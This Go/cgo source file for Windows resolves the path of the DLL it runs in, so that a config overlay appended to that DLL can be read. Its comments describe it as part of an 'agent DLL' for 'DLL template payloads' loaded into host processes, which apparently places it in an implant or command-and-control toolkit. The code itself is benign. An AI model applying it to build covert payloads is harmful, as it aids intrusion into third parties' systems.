//go:build windows && cgo

package config

/*
#include <windows.h>

// selfAnchor returns the address of a symbol inside this module (the agent
// DLL). GetModuleHandleEx with the FROM_ADDRESS flag resolves that address to
// the module handle, letting us read the DLL's own path — os.Executable()
// would only give the host process's EXE.
static void* selfAnchor(void) {
    static int marker;
    return (void*)&marker;
}

static HMODULE selfModule(void) {
    HMODULE m = NULL;
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCWSTR)selfAnchor(), &m);
    return m;
}

static int selfPathW(HMODULE m, wchar_t* buf, int cap) {
    return GetModuleFileNameW(m, buf, cap);
}
*/
import "C"

import (
	"fmt"
	"syscall"
	"unsafe"
)

// selfBinaryPath returns the path of the agent DLL itself. This is required for
// DLL template payloads: the config overlay is appended to the DLL file, and
// while it is loaded through LoadLibrary, os.Executable() points at the host
// process, not the DLL.
func selfBinaryPath() (string, error) {
	m := C.selfModule()
	if m == nil {
		return "", fmt.Errorf("resolve agent module handle failed")
	}
	buf := make([]uint16, 4096)
	n := C.selfPathW(m, (*C.wchar_t)(unsafe.Pointer(&buf[0])), C.int(len(buf)))
	if n <= 0 {
		return "", fmt.Errorf("GetModuleFileName failed")
	}
	return syscall.UTF16ToString(buf[:n]), nil
}
